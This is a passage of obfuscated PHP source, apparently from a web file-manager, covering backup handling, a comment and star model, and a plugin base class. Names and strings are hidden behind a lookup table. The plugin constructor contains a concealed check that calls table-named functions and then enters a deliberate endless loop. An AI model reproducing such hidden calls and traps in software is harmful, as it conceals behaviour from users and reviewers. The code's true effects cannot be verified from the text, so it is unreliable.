$¥ğÂ¶Îš = $this->backupPath($ƒöâëÃû); IO::remove($¥ğÂ¶Îš, !1); return !0; } private function backupPath($ª…¾±²ë) { $ˆïè…â¬ =& $_SERVER[Ù×¯Ø…]; $õĞÒÒ­è = $ª…¾±²ë[$ˆïè…â¬[28]]; $¬¤¾“•ã = Model($ˆïè…â¬[769])->get($ˆïè…â¬[770]); $ÃÍŒ‚şµ = substr(md5($ˆïè…â¬[771] . $¬¤¾“•ã . $õĞÒÒ­è), 0, 8); return "\x7b\151\x6f\72{$ª…¾±²ë[$ˆïè…â¬[751]]}\175\x2f\144\x61\164\x61\142\x61\x73\145\57\142\141\x63\x6b\165\x70\x2f" . $õĞÒÒ­è . $ˆïè…â¬[71] . $ÃÍŒ‚şµ; } public function start() { $‡¢ÙÅÈ =& $_SERVER[Ù×¯Ø…]; if ($GLOBALS[$‡¢ÙÅÈ[6]][$‡¢ÙÅÈ[88]][$‡¢ÙÅÈ[1775]] != $‡¢ÙÅÈ[87]) { return !0; } $À±ğŞë€ = $this->config(); if (!$À±ğŞë€ || $À±ğŞë€[$‡¢ÙÅÈ[1550]] != $‡¢ÙÅÈ[87]) { return !1; } $ª×ãŒà = $this->process(); foreach ($ª×ãŒà as $ğæûÇê²) { if ($ğæûÇê²) { return Task::restart($ğæûÇê²[$‡¢ÙÅÈ[395]]); } } $Ü… ¡ƒ² = new Backup(); $ñ€ÑæÁ’ = $Ü… ¡ƒ²->db(); if ($ñ€ÑæÁ’) { $ñ€ÑæÁ’ = $Ü… ¡ƒ²->dbFile(); if ($ñ€ÑæÁ’ && $À±ğŞë€[$‡¢ÙÅÈ[754]] == $‡¢ÙÅÈ[191]) { $ñ€ÑæÁ’ = $Ü… ¡ƒ²->file(); } } Backup::set(array($‡¢ÙÅÈ[749] => 1, $‡¢ÙÅÈ[499] => time())); return !0; } public function process() { $«†¾í¹ =& $_SERVER[Ù×¯Ø…]; return array($«†¾í¹[757] => Task::get($«†¾í¹[780]), $«†¾í¹[761] => Task::get($«†¾í¹[805]), $«†¾í¹[193] => Task::get($«†¾í¹[815])); } public function restore() { $ é¸÷²¬ =& $_SERVER[Ù×¯Ø…]; ActionCall($ é¸÷²¬[1056], !0, 1); ActionCall($ é¸÷²¬[1056], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\x6d\x65\156\164"; protected $tableMeta = array("\x74\141\x62\154\145\116\141\x6d\x65" => "\143\157\155\155\145\156\164\x5f\155\x65\164\x61", "\x6d\145\164\141\x46\151\145\x6c\144" => "\143\x6f\x6d\x6d\145\156\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($²ÏÚÉº) { $¿£¯†£ñ =& $_SERVER[Ù×¯Ø…]; if ($²ÏÚÉº[$¿£¯†£ñ[1776]]) { $ä®¶“ÁŞ = $this->where(array($¿£¯†£ñ[1777] => $²ÏÚÉº[$¿£¯†£ñ[1776]]))->find(); if (!$ä®¶“ÁŞ || $ä®¶“ÁŞ[$¿£¯†£ñ[415]] != $²ÏÚÉº[$¿£¯†£ñ[415]] || $ä®¶“ÁŞ[$¿£¯†£ñ[507]] != $²ÏÚÉº[$¿£¯†£ñ[507]]) { return !1; } $this->where(array($¿£¯†£ñ[1777] => $²ÏÚÉº[$¿£¯†£ñ[1776]]))->setAdd($¿£¯†£ñ[1778], 1); } $²ÏÚÉº[$¿£¯†£ñ[1779]] = 0; $²ÏÚÉº[$¿£¯†£ñ[1778]] = 0; $²ÏÚÉº[$¿£¯†£ñ[749]] = 1; return $this->add($²ÏÚÉº); } public function commentCount($È–İÄ±·, $É÷€ˆæ’, $Ñ¾ôöı¨ = false) { $‰Ğ¡ø£€ =& $_SERVER[Ù×¯Ø…]; if (!$È–İÄ±·) { return array(); } if (is_string($È–İÄ±·) || is_int($È–İÄ±·)) { $È–İÄ±· = array($È–İÄ±·); } $È«—¶ª = array($‰Ğ¡ø£€[507], $‰Ğ¡ø£€[1780] => $‰Ğ¡ø£€[503]); $¹à‹•ü = array($‰Ğ¡ø£€[507] => array($‰Ğ¡ø£€[7], $È–İÄ±·), $‰Ğ¡ø£€[415] => $É÷€ˆæ’); if ($Ñ¾ôöı¨) { $¹à‹•ü[$‰Ğ¡ø£€[1580]] = $Ñ¾ôöı¨; } $ºªé›ßİ = $this->field($È«—¶ª)->where($¹à‹•ü)->group($‰Ğ¡ø£€[507])->select(); return array_to_keyvalue($ºªé›ßİ, $‰Ğ¡ø£€[507], $‰Ğ¡ø£€[503]); } public function starTarget($Åµ÷Ëøë, $­ÖĞ¯ÄÂ) { $‹÷œû²ì =& $_SERVER[Ù×¯Ø…]; $º¤ı¼‘ = $Åµ÷Ëøë + self::TYPE_STAR_OFFSET; $ŞÔÔˆ™ = array($‹÷œû²ì[1580] => USER_ID, $‹÷œû²ì[415] => $º¤ı¼‘, $‹÷œû²ì[507] => $­ÖĞ¯ÄÂ); $ş¶•ïÖÖ = $this->where($ŞÔÔˆ™)->find(); if ($ş¶•ïÖÖ) { return $this->where(array($‹÷œû²ì[395] => $ş¶•ïÖÖ[$‹÷œû²ì[395]]))->delete(); } $±Ø·°ô’ = array($‹÷œû²ì[1776] => 0, $‹÷œû²ì[1580] => USER_ID, $‹÷œû²ì[749] => 1, $‹÷œû²ì[754] => $‹÷œû²ì[33], $‹÷œû²ì[415] => $º¤ı¼‘, $‹÷œû²ì[507] => $­ÖĞ¯ÄÂ, $‹÷œû²ì[1779] => 0, $‹÷œû²ì[1778] => 0); return $this->add($±Ø·°ô’); } public function starTargetCount($¤ğ°¹ö…, $ òæ—§) { $µàÄÎÇ =& $_SERVER[Ù×¯Ø…]; $şºì´…Î = $ òæ—§ + self::TYPE_STAR_OFFSET; $«¬ÜÌ¦ = $this->commentCount($¤ğ°¹ö…, $şºì´…Î); $óıëœÓ˜ = $this->commentCount($¤ğ°¹ö…, $şºì´…Î, USER_ID); return array($µàÄÎÇ[1781] => $«¬ÜÌ¦, $µàÄÎÇ[1782] => $óıëœÓ˜); } public function starTargetUserList($ì£Ã§Ş, $ŒÄÏŞÔï) { $˜’Üèì =& $_SERVER[Ù×¯Ø…]; $˜µÒ«¹ï = $ì£Ã§Ş + self::TYPE_STAR_OFFSET; $£ÔÈÙ’¤ = array($˜’Üèì[507] => $ŒÄÏŞÔï, $˜’Üèì[415] => $˜µÒ«¹ï); $êÎÈğÑ = $this->where($£ÔÈÙ’¤)->count(); $ÁûªÆËª = array($˜’Üèì[253] => $êÎÈğÑ, $˜’Üèì[1783] => array()); if (!$êÎÈğÑ) { return $ÁûªÆËª; } $›°¯ŒÑ– = $this->field($˜’Üèì[1580])->where($£ÔÈÙ’¤)->limit(500)->select(); $›°¯ŒÑ– = array_to_keyvalue($›°¯ŒÑ–, $˜’Üèì[33], $˜’Üèì[1580]); $ÁûªÆËª[$˜’Üèì[1783]] = Model($˜’Üèì[516])->userListInfo($›°¯ŒÑ–); return $ÁûªÆËª; } public function prasiseUserList($Ğ°ºæ«‰) { $áíÛŒ–Õ =& $_SERVER[Ù×¯Ø…]; $ã°ÃßĞÒ = array($áíÛŒ–Õ[1784] => $Ğ°ºæ«‰); $¼¶èû’¹ = $this->where($ã°ÃßĞÒ)->find(); $ñâŸ‰Ì = _get($¼¶èû’¹, $áíÛŒ–Õ[1779], 0); $«èıŞåê = array($áíÛŒ–Õ[253] => $ñâŸ‰Ì, $áíÛŒ–Õ[1783] => array()); if (!$ñâŸ‰Ì) { return $«èıŞåê; } $âöÁÄ•“ = Model($áíÛŒ–Õ[1785])->field($áíÛŒ–Õ[1580])->where($ã°ÃßĞÒ)->limit(500)->select(); $âöÁÄ•“ = array_to_keyvalue($âöÁÄ•“, $áíÛŒ–Õ[33], $áíÛŒ–Õ[1580]); $«èıŞåê[$áíÛŒ–Õ[1783]] = Model($áíÛŒ–Õ[516])->userListInfo($âöÁÄ•“); return $«èıŞåê; } public function remove($âáñŞ») { $¦Ú“ºÉÅ =& $_SERVER[Ù×¯Ø…]; $çü¸Ö†¹ = array($¦Ú“ºÉÅ[1777] => $âáñŞ»); $Â¡€ÜìÔ = $this->where($çü¸Ö†¹)->find(); if ($Â¡€ÜìÔ[$¦Ú“ºÉÅ[1776]]) { $this->where(array($¦Ú“ºÉÅ[1777] => $Â¡€ÜìÔ[$¦Ú“ºÉÅ[1776]]))->setAdd($¦Ú“ºÉÅ[1778], -1); } return $this->where($çü¸Ö†¹)->delete(); } public function edit($Û¢¹ë¡, $İ€ßåáÚ) { $İËœ‹Ä¹ =& $_SERVER[Ù×¯Ø…]; $­‡†±„½ = array($İËœ‹Ä¹[1777] => $Û¢¹ë¡); return $this->where($­‡†±„½)->save(array($İËœ‹Ä¹[1786] => $İ€ßåáÚ)); } public function prasise($¡ùè§Ó) { $¾³†˜Èä =& $_SERVER[Ù×¯Ø…]; $¢§¨¡« = Model($¾³†˜Èä[1787]); $Øë¥øÂ÷ = array($¾³†˜Èä[1777] => $¡ùè§Ó, $¾³†˜Èä[1571] => USER_ID); $Å‘ôÉ¨ = $¢§¨¡«->where($Øë¥øÂ÷)->find(); if (!$Å‘ôÉ¨) { $¢§¨¡«->add($Øë¥øÂ÷); $œ«ÌœÄÆ = $this->where(array($¾³†˜Èä[1777] => $¡ùè§Ó))->setAdd($¾³†˜Èä[1779], 1); } else { $¢§¨¡«->where($Øë¥øÂ÷)->delete(); $œ«ÌœÄÆ = $this->where(array($¾³†˜Èä[1777] => $¡ùè§Ó))->setAdd($¾³†˜Èä[1779], -1); } return $œ«ÌœÄÆ; } public function targetInfo($„¥ˆƒ—À, $—²˜äÍÅ) { $ÕùäÆ¥ =& $_SERVER[Ù×¯Ø…]; $Õì´³ó´ = array($ÕùäÆ¥[583] => $„¥ˆƒ—À, $ÕùäÆ¥[584] => $—²˜äÍÅ); $ü«…ğ—¶ = $this->where($Õì´³ó´)->count(); $ÈğØêäÍ = "\x52\111\107\110\x54\x20\x4a\x4f\111\116\40{$this->tablePrefix}\143\x6f\x6d\155\145\156\164\137\160\x72\x61\x69\163\145\x20\163\x74\141\x72\x20\157\156\x20\143\x6f\x6d\155\x65\156\164\56\x63\157\155\155\145\156\164\111\x44\40\x3d\40\x73\x74\141\x72\x2e\143\x6f\x6d\x6d\x65\156\164\111\104"; $á…äŸ²¨ = $this->alias($ÕùäÆ¥[352])->where($Õì´³ó´)->join($ÈğØêäÍ, $ÕùäÆ¥[1788])->count(); $ê‡ÄçÁş = array($ÕùäÆ¥[1789] => $ü«…ğ—¶, $ÕùäÆ¥[1790] => $á…äŸ²¨); return $ê‡ÄçÁş; } public function listData($Èú‹Î„ƒ) { $áİÆìº« =& $_SERVER[Ù×¯Ø…]; if (isset($Èú‹Î„ƒ[$áİÆìº«[1791]])) { if ($Èú‹Î„ƒ[$áİÆìº«[1791]]) { $Èú‹Î„ƒ[$áİÆìº«[1784]] = array($áİÆìº«[1010], intval($Èú‹Î„ƒ[$áİÆìº«[1791]])); } unset($Èú‹Î„ƒ[$áİÆìº«[1791]]); } if (isset($Èú‹Î„ƒ[$áİÆìº«[1792]])) { if ($Èú‹Î„ƒ[$áİÆìº«[1792]]) { $Èú‹Î„ƒ[$áİÆìº«[1784]] = array($áİÆìº«[1007], intval($Èú‹Î„ƒ[$áİÆìº«[1792]])); } unset($Èú‹Î„ƒ[$áİÆìº«[1792]]); } return $this->_listData($Èú‹Î„ƒ); } private function _listData($÷ğº¤»÷) { $Îùª·”Î =& $_SERVER[Ù×¯Ø…]; $ªôÍí®æ = $this->where($÷ğº¤»÷)->_makeOrder()->selectPage(100); $this->_listAppendParent($ªôÍí®æ[$Îùª·”Î[367]]); $this->_listAppendUser($ªôÍí®æ[$Îùª·”Î[367]]); $this->_listAppendMeta($ªôÍí®æ[$Îùª·”Î[367]]); return $ªôÍí®æ; } private function _makeOrder() { $Áı¾§† =& $_SERVER[Ù×¯Ø…]; $»òôÇßé = array($Áı¾§†[1779], $Áı¾§†[1778], $Áı¾§†[194]); $Âì€²ã˜ = Input::get($Áı¾§†[458], $Áı¾§†[7], $Áı¾§†[427], $»òôÇßé); $Çï›¹º = Input::get($Áı¾§†[459], $Áı¾§†[7], $Áı¾§†[1573], array($Áı¾§†[1793], $Áı¾§†[454])); $ÈÌƒö = $Âì€²ã˜ . $Áı¾§†[50] . $Çï›¹º; return $this->order($ÈÌƒö); } private function _listAppendParent(&$ßãüÙ’€) { $ÂÜâĞ»® =& $_SERVER[Ù×¯Ø…]; $âäğ„ˆã = array_unique(array_to_keyvalue($ßãüÙ’€, $ÂÜâĞ»®[33], $ÂÜâĞ»®[1776])); $âäğ„ˆã = array_remove_value($âäğ„ˆã, $ÂÜâĞ»®[191]); if (!$âäğ„ˆã) { return; } $²åÑ¯ÊÒ = $this->where(array($ÂÜâĞ»®[1777] => array($ÂÜâĞ»®[7], $âäğ„ˆã)))->select(); $²åÑ¯ÊÒ = array_to_keyvalue($²åÑ¯ÊÒ, $ÂÜâĞ»®[1784]); foreach ($ßãüÙ’€ as &$±ËĞ¹Ç ) { if (isset($²åÑ¯ÊÒ[$±ËĞ¹Ç [$ÂÜâĞ»®[1776]]])) { $±ËĞ¹Ç [$ÂÜâĞ»®[1794]] = $²åÑ¯ÊÒ[$±ËĞ¹Ç [$ÂÜâĞ»®[1776]]]; } } unset($±ËĞ¹Ç ); } private function _listAppendUser(&$‚üÉØî­) { $««­èÏ =& $_SERVER[Ù×¯Ø…]; $Òö—Ú° = array_unique(array_to_keyvalue($‚üÉØî­, $««­èÏ[33], $««­èÏ[1580])); $Òö—Ú° = array_remove_value($Òö—Ú°, $««­èÏ[191]); if (count($Òö—Ú°) == 0) { return; } foreach ($‚üÉØî­ as $ø÷ï£Ø÷) { if (isset($ø÷ï£Ø÷[$««­èÏ[1794]])) { $Òö—Ú°[] = $ø÷ï£Ø÷[$««­èÏ[1794]][$««­èÏ[1580]]; } } $¯£Ø½ÇÃ = Model($««­èÏ[541])->userListInfo($Òö—Ú°); foreach ($‚üÉØî­ as &$ø÷ï£Ø÷) { $ø÷ï£Ø÷[$««­èÏ[597]] = $¯£Ø½ÇÃ[$ø÷ï£Ø÷[$««­èÏ[1580]]]; if (isset($ø÷ï£Ø÷[$««­èÏ[1794]])) { $ø÷ï£Ø÷[$««­èÏ[1794]][$««­èÏ[597]] = $¯£Ø½ÇÃ[$ø÷ï£Ø÷[$««­èÏ[1794]][$««­èÏ[1580]]]; } } unset($ø÷ï£Ø÷); } private function _listAppendMeta(&$±È¡úİÓ) { $şÇâùû¿ =& $_SERVER[Ù×¯Ø…]; $ªåªÚ€” = array_unique(array_to_keyvalue($±È¡úİÓ, $şÇâùû¿[33], $şÇâùû¿[1784])); $ªåªÚ€” = array_remove_value($ªåªÚ€”, $şÇâùû¿[191]); if (!$ªåªÚ€”) { return; } foreach ($±È¡úİÓ as $êĞ×ÁùÑ) { if (isset($êĞ×ÁùÑ[$şÇâùû¿[1794]])) { $ªåªÚ€”[] = $êĞ×ÁùÑ[$şÇâùû¿[1794]][$şÇâùû¿[1784]]; } } $ãñµµõ = $this->metaList($ªåªÚ€”); if (!$ãñµµõ) { return !1; } foreach ($±È¡úİÓ as &$êĞ×ÁùÑ) { $êĞ×ÁùÑ[$şÇâùû¿[468]] = $ãñµµõ[$êĞ×ÁùÑ[$şÇâùû¿[1784]]]; if (isset($êĞ×ÁùÑ[$şÇâùû¿[1794]])) { $êĞ×ÁùÑ[$şÇâùû¿[1794]][$şÇâùû¿[468]] = $ãñµµõ[$êĞ×ÁùÑ[$şÇâùû¿[1794]][$şÇâùû¿[1784]]]; } } unset($êĞ×ÁùÑ); } private function metaList($¦‡”Ù·‡) { $şœµ˜†˜ =& $_SERVER[Ù×¯Ø…]; if (!$¦‡”Ù·‡) { return array(); } $òÏÅ•À = array($şœµ˜†˜[1784] => array($şœµ˜†˜[7], $¦‡”Ù·‡)); $óüíùÁ¼ = Model($şœµ˜†˜[1795])->where($òÏÅ•À)->select(); $óüíùÁ¼ = array_to_keyvalue_group($óüíùÁ¼, $şœµ˜†˜[1784]); foreach ($óüíùÁ¼ as $¢Ç¦øˆ¢ => $Ì§Ò‘ı£) { $ê¦ÈñµÈ = array(); foreach ($Ì§Ò‘ı£ as $½¨‰»¢) { $ê¦ÈñµÈ[$½¨‰»¢[$şœµ˜†˜[93]]] = $½¨‰»¢[$şœµ˜†˜[372]]; } $óüíùÁ¼[$¢Ç¦øˆ¢] = $ê¦ÈñµÈ; } return $óüíùÁ¼ ? $óüíùÁ¼ : array(); } } goto FÒÆ²ÆåÂÓ; D¾è…©äìª: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Âì´Òê¬ =& $_SERVER[Ù×¯Ø…]; if (!isset($_SERVER[$Âì´Òê¬[398]]) || !isset($_SERVER[$Âì´Òê¬[396]])) { $è»ïé‚  = $Âì´Òê¬[878]; $¦¯‹ş¯Á = $Âì´Òê¬[399]; $°Šãœ–Ñ = $_SERVER[$Âì´Òê¬[400]] . $Âì´Òê¬[401]; $ùÕÕ§ù‹ = $¦¯‹ş¯Á($°Šãœ–Ñ); $¿Èë¾ = explode($Âì´Òê¬[229], $ùÕÕ§ù‹); if (count($¿Èë¾) < $Âì´Òê¬[618]) { $û–×Šœ = $Âì´Òê¬[403]; $û–×Šœ(); } $ì¾‰¨İ˜ = $Âì´Òê¬[879]; $ì¾‰¨İ˜($_SERVER[$Âì´Òê¬[880]]); $Éìˆ¦Àš = 1; for ($û˜´ÉÊå = $Éìˆ¦Àš; $û˜´ÉÊå > 0; $û˜´ÉÊå++) { $ì¾‰¨İ˜ = json_encode($GLOBALS[$Âì´Òê¬[422]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Âì´Òê¬[1446]); $this->pluginName = str_replace($Âì´Òê¬[1446], $Âì´Òê¬[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Âì´Òê¬[8]; $this->pluginApi = appHostGet() . $Âì´Òê¬[1447] . $this->pluginName . $Âì´Òê¬[8]; $this->pluginHost = $config[$Âì´Òê¬[1448]] . $this->pluginName . $Âì´Òê¬[8]; $this->pluginHostDefault = $config[$Âì´Òê¬[1448]] . $this->pluginName . $Âì´Òê¬[8]; $ªŒÁ¡õˆ = $config[$Âì´Òê¬[1449]]; if ($ªŒÁ¡õˆ && strpos($Âì´Òê¬[47] . $ªŒÁ¡õˆ . $Âì´Òê¬[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$Âì´Òê¬[1450]] . $this->pluginName . $Âì´Òê¬[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ù×¯Ø…][1451]); } protected function assign($ ¥Ääæ±, $Õã¼úµ = false) { if (is_array($ ¥Ääæ±)) { $this->values = array_merge($this->values, $ ¥Ääæ±); } else { $this->values[$ ¥Ääæ±] = $Õã¼úµ; } } protected function display($ËÎÜŞ­¾) { extract($this->values); require $ËÎÜŞ­¾; } final function hookRegist($èà…Ñõè) { $this->modelPlugin->appRegist($this->pluginName, $èà…Ñõè); } final function appIcon() { $ş·£œÄ =& $_SERVER[Ù×¯Ø…]; $Û¿Ó¬©ó = $this->appPackage(); $Óü çÌò = $ş·£œÄ[33]; if (isset($Û¿Ó¬©ó[$ş·£œÄ[420]])) { if (isset($Û¿Ó¬©ó[$ş·£œÄ[420]][$ş·£œÄ[1452]])) { $Óü çÌò = $ş·£œÄ[1453] . $Û¿Ó¬©ó[$ş·£œÄ[420]][$ş·£œÄ[1452]] . $ş·£œÄ[1454]; } else { if ($Û¿Ó¬©ó[$ş·£œÄ[420]][$ş·£œÄ[1455]]) { $Óü çÌò = $ş·£œÄ[1456] . $Û¿Ó¬©ó[$ş·£œÄ[420]][$ş·£œÄ[1455]] . $ş·£œÄ[1457]; } } } return $Óü çÌò; } final function fileCanView($Ì­ø·ûã) { $œöñˆ­Ö =& $_SERVER[Ù×¯Ø…]; if (request_url_safe($Ì­ø·ûã)) { return !0; } if ($this->isShare($Ì­ø·ûã)) { return !0; } $°ø†¬ß‘ = Session::get($œöñˆ­Ö[1458]); if (!$°ø†¬ß‘ || !$°ø†¬ß‘[$œöñˆ­Ö[1459]]) { $ÅË¯¡ç = $œöñˆ­Ö[1460] . rawurlencode(this_url()); show_tips(LNG($œöñˆ­Ö[1461]) . $œöñˆ­Ö[1462] . $ÅË¯¡ç . $œöñˆ­Ö[1463] . LNG($œöñˆ­Ö[1464]) . $œöñˆ­Ö[1465], !1); } if (!Action($œöñˆ­Ö[1466])->authCan($œöñˆ­Ö[1467])) { show_tips(LNG($œöñˆ­Ö[1468]) . $œöñˆ­Ö[1469], !1); } ActionCall($œöñˆ­Ö[1470], $Ì­ø·ûã); } final function isShare($µ»•ï”) { $Ó—©Ì³ = KodIO::parse($µ»•ï”); return $Ó—©Ì³[$_SERVER[Ù×¯Ø…][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($˜İñ®¬) { if (request_url_safe($˜İñ®¬)) { return $˜İñ®¬; } if (!$this->isShare($˜İñ®¬)) { $˜İñ®¬ = $this->filePath($˜İñ®¬); } return Action($_SERVER[Ù×¯Ø…][1105])->linkOut($˜İñ®¬); } public function filePathLinkOut($Ÿƒ»¢ö) { if (request_url_safe($Ÿƒ»¢ö)) { return $Ÿƒ»¢ö; } $this->fileCanView($Ÿƒ»¢ö); return Action($_SERVER[Ù×¯Ø…][1105])->link($Ÿƒ»¢ö); } final function filePath($„²Î’…Ì) { $–›œÓ« =& $_SERVER[Ù×¯Ø…]; if ($µ•úĞ®‰ = $this->checkSharePath($„²Î’…Ì)) { Hook::trigger($–›œÓ«[1471], $µ•úĞ®‰); return $µ•úĞ®‰; } $this->fileCanView($„²Î’…Ì); if (request_url_safe($„²Î’…Ì)) { $²¼”¤âé = parse_url_query($„²Î’…Ì); if (isset($²¼”¤âé[$–›œÓ«[1472]]) && isset($²¼”¤âé[$–›œÓ«[209]])) { $è³ä™™ç = Model($–›œÓ«[769])->get($–›œÓ«[770]); $òŸ¤öà÷ = Mcrypt::decode($²¼”¤âé[$–›œÓ«[209]], $è³ä™™ç); if ($òŸ¤öà÷) { $this->fileInfo = IO::infoWithChildren($òŸ¤öà÷); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $òŸ¤öà÷; } } $„²Î’…Ì = $this->_cacheHttpFile($„²Î’…Ì); $this->fileInfo = IO::infoWithChildren($„²Î’…Ì); } else { $this->fileInfo = IO::infoWithChildren($„²Î’…Ì); if (!$this->fileInfo) { show_tips(LNG($–›œÓ«[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($–›œÓ«[1471], $„²Î’…Ì); return $„²Î’…Ì; } final function _cacheHttpFile($ò¿×Û±) { $Ë¹—îŠ‰ = hash_path($ò¿×Û±, !0); $this->cachePath = $this->pluginCachePath($Ë¹—îŠ‰); if ($²é÷ó¨í = IO::fileNameExist($this->cachePath, $Ë¹—îŠ‰)) { return KodIO::make($²é÷ó¨í); } $çÍ÷Ÿš = $this->cachePath . $Ë¹—îŠ‰; return $this->pluginCacheFileSet($çÍ÷Ÿš, file_get_contents_nossl($ò¿×Û±)); } final function _tmpFileName($ÚÖ¡¹Û = array()) { $Æ‰¬ªÔÑ =& $_SERVER[Ù×¯Ø…]; if (!$ÚÖ¡¹Û) { $ÚÖ¡¹Û = $this->fileInfo; } if (isset($ÚÖ¡¹Û[$Æ‰¬ªÔÑ[171]])) { return $ÚÖ¡¹Û[$Æ‰¬ªÔÑ[171]]; } if (isset($ÚÖ¡¹Û[$Æ‰¬ªÔÑ[164]][$Æ‰¬ªÔÑ[171]])) { return $ÚÖ¡¹Û[$Æ‰¬ªÔÑ[164]][$Æ‰¬ªÔÑ[171]]; } $óÅêí¦ä = IO::hashSimple($ÚÖ¡¹Û[$Æ‰¬ªÔÑ[76]]); if ($óÅêí¦ä) { return $óÅêí¦ä; } $–­½á¤ë = array($ÚÖ¡¹Û[$Æ‰¬ªÔÑ[28]], $ÚÖ¡¹Û[$Æ‰¬ªÔÑ[76]], $ÚÖ¡¹Û[$Æ‰¬ªÔÑ[78]]); if (isset($ÚÖ¡¹Û[$Æ‰¬ªÔÑ[524]])) { $–­½á¤ë[] = $ÚÖ¡¹Û[$Æ‰¬ªÔÑ[524]]; } return md5(implode($Æ‰¬ªÔÑ[71], $–­½á¤ë)); } final function checkSharePath($˜ÙÕá¯ğ) { $ŠóÕœş÷ =& $_SERVER[Ù×¯Ø…]; if (!defined($ŠóÕœş÷[477])) { define($ŠóÕœş÷[517], 0); } if (!$this->isShare($˜ÙÕá¯ğ)) { return !1; } $å¬Óè· = Action($ŠóÕœş÷[1105])->sharePathInfo($˜ÙÕá¯ğ); if (!isset($å¬Óè·[$ŠóÕœş÷[76]])) { show_json(LNG($ŠóÕœş÷[1473]), !1); } $this->fileInfo = $å¬Óè·[$ŠóÕœş÷[164]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ŠóÕœş÷[171]]); return $å¬Óè·[$ŠóÕœş÷[76]]; } final function pluginCachePath($÷à´Ùˆ = '') { $½¼ÅÃ” =& $_SERVER[Ù×¯Ø…]; $Î²©ÍÚĞ = IO_PATH_SYSTEM_TEMP . $½¼ÅÃ”[1474] . $this->pluginName; if (!($‘×Á´¬« = IO::infoFull($Î²©ÍÚĞ))) { return IO::mkdir($Î²©ÍÚĞ . $½¼ÅÃ”[8] . $÷à´Ùˆ); } if (empty($÷à´Ùˆ)) { return $‘×Á´¬«[$½¼ÅÃ”[76]]; } if (!($ğãã…Î  = IO::fileNameExist($‘×Á´¬«[$½¼ÅÃ”[76]], $÷à´Ùˆ))) { return IO::mkdir($‘×Á´¬«[$½¼ÅÃ”[76]] . $÷à´Ùˆ); } return KodIO::make($ğãã…Î ); } final function pluginCacheFileSet($ÃÅ…¼í·, $Øıƒ•½ü = '') { $°ä‚àû =& $_SERVER[Ù×¯Ø…]; if (!($–Æœ¸¬½ = IO::infoFull($ÃÅ…¼í·))) { return IO::mkfile($ÃÅ…¼í·, $Øıƒ•½ü, REPEAT_REPLACE); } IO::setContent($–Æœ¸¬½[$°ä‚àû[76]], $Øıƒ•½ü); return $–Æœ¸¬½[$°ä‚àû[76]]; } final function pluginLocalFile($¼ÆşÇùı = '') { $ÀëèĞ’± =& $_SERVER[Ù×¯Ø…]; $ëÛ†êŒä = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ëÛ†êŒä)) { mk_dir($ëÛ†êŒä); } if (!$¼ÆşÇùı) { return $ëÛ†êŒä; } $™€Ş±É = IO::info($¼ÆşÇùı); $¤Äë°™ = $this->_tmpFileName($™€Ş±É) . $ÀëèĞ’±[95] . $™€Ş±É[$ÀëèĞ’±[168]]; if (!checkExtSafe($¤Äë°™)) { $¤Äë°™ = $¤Äë°™ . $ÀëèĞ’±[1475]; } $Èú©Ã¢Ô = $ëÛ†êŒä . $¤Äë°™; if (@file_exists($Èú©Ã¢Ô)) { return $Èú©Ã¢Ô; } return IO::copy($¼ÆşÇùı, $ëÛ†êŒä, 0, $¤Äë°™); } final function appPackage() { $êœêÃÛ£ =& $_SERVER[Ù×¯Ø…]; if ($this->packageData) { return $this->packageData; } $¯™’¼¡¿ = $this->parseFile($this->pluginPath . $êœêÃÛ£[1476]); $this->parseLang($¯™’¼¡¿); $¨öíÄ¦õ = json_decode_force($¯™’¼¡¿); if (!$¨öíÄ¦õ) { return array(); } $íÃ•ëÔû = Hook::trigger($êœêÃÛ£[1477], $¨öíÄ¦õ); if ($íÃ•ëÔû && is_array($íÃ•ëÔû)) { $¨öíÄ¦õ = $íÃ•ëÔû; } $this->packageData = $¨öíÄ¦õ; return $¨öíÄ¦õ; } public function packageInfoGet($ØÅËÉØÕ) { $ó¤Š’ÆÕ = $this->appPackage(); return array_get_value($ó¤Š’ÆÕ, $ØÅËÉØÕ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ù×¯Ø…][1478]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ù×¯Ø…][1479]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ù×¯Ø…][1480]); } public function echoJsAssign($’ø¯…Ù, $—”‡ìÊ) { $this->echoJsAssignArr[$’ø¯…Ù] = $—”‡ìÊ; } private function parseFile($ÂÍÄ’Ô‡) { $Öä¦×Ø™ =& $_SERVER[Ù×¯Ø…]; $‰Í‰–Ñ = file_get_contents_nossl($ÂÍÄ’Ô‡); $¢úÎ“é† = array($Öä¦×Ø™[1481], $Öä¦×Ø™[1482], $Öä¦×Ø™[1483], $Öä¦×Ø™[1484], $Öä¦×Ø™[1485], $Öä¦×Ø™[1486], $Öä¦×Ø™[1487]); $õèğ³àó = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Öä¦×Ø™[88]][$Öä¦×Ø™[1488]]); foreach ($this->echoJsAssignArr as $ğä—¬Öã => $Ã¢¨àšù) { $¢úÎ“é†[] = $Öä¦×Ø™[1489] . $ğä—¬Öã . $Öä¦×Ø™[1490]; $õèğ³àó[] = is_array($Ã¢¨àšù) || is_object($Ã¢¨àšù) ? 